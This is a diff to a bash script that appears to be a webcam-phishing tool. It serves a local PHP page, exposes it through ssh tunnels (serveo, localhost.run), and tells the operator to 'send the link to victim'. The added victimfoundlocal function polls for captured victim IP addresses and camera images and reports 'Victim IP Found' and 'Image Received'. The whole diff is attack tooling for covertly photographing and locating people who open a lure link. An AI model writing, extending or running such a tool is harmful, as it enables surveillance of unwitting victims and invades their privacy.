@@ -137,7 +137,7 @@ printf "\e[0m\n"
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $link
 
-
+victimfound
 }
 
 start_serveo() {
@@ -189,7 +189,7 @@ printf "\e[0m\n"
 printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n' $serv_link
 printf "\n"
 
-
+victimfound
 }
 
 start_pagekite() {
@@ -255,16 +255,36 @@ printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching LocalhostRun...\e[0m\n"
 fuser -k $local_port/tcp > /dev/null 2>&1
 cd .www/ && php -S localhost:$local_port > /dev/null 2>&1 &
-chmod +x .www/index.php
-PORT=$local_port ./.www/index.php
 sleep 3
 banner
 printf "\e[0m\n"
-printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m' ssh -R 80:localhost:$local_port ssh.localhost.run
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Press Ctrl + C to Stop Tunnelling.\e[0m\n"
+printf "\e[0m\n"
+printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m'
+ssh -R 80:localhost:$local_port ssh.localhost.run
 printf "\n"
+victimfoundlocal
+}
+victimfoundlocal() {
+
+while [ true ]; do
+
+if [[ -e "victim-ip.txt" ]]; then
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Victim IP Found !!\n"
+saveip	
+rm -rf victim-ip.txt
+
+fi
+
+sleep 0.5
+
+if [[ -e ".www/.cam.log" ]]; then
+printf "\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Image Received !!\e[0m\n"
+fi
 
 }
+
 banner
 req
 menu
-victimfound
